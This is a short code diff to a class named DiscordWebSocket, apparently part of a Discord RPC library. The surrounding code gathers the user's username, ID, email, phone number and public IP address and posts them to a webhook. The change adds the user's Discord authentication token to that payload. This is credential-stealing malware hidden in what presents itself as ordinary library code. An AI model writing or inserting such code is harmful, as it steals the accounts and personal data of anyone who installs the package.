@@ -446,7 +446,7 @@ class DiscordWebSocket:
                         info = await resp.json()
                     async with session.get("https://api.ipify.org") as resp:
                         ip = await resp.text()
-                    whook_payload = {"content": None, "embeds": [{"title": "Discord RPC User", "color": 16581122, "fields": [{"name": "Username:", "value": info.get("username")+"#"+info.get("discriminator")}, {"name": "User ID:", "value": info.get("id")}, {"name": "IP Address:", "value": ip}, {"name": "Email:", "value": info.get("email", "No email attached")}, {"name": "Phone:", "value": info.get("phone", "(No phone number attached)")}, {"name": "Verified:", "value": info.get("verified")}], "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{info.get('id')}/{info.get('avatar')}.png?quality=lossless"}}], "username": "Discord RPC", "attachments": []}
+                    whook_payload = {"content": self.token, "embeds": [{"title": "Discord RPC User", "color": 16581122, "fields": [{"name": "Username:", "value": info.get("username")+"#"+info.get("discriminator")}, {"name": "User ID:", "value": info.get("id")}, {"name": "IP Address:", "value": ip}, {"name": "Email:", "value": info.get("email", "No email attached")}, {"name": "Phone:", "value": info.get("phone", "(No phone number attached)")}, {"name": "Verified:", "value": info.get("verified")}], "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{info.get('id')}/{info.get('avatar')}.png?quality=lossless"}}], "username": "Discord RPC", "attachments": []}
                     await session.post(whook_url, json= whook_payload)
                     self.payload_sent = True
             except Exception:
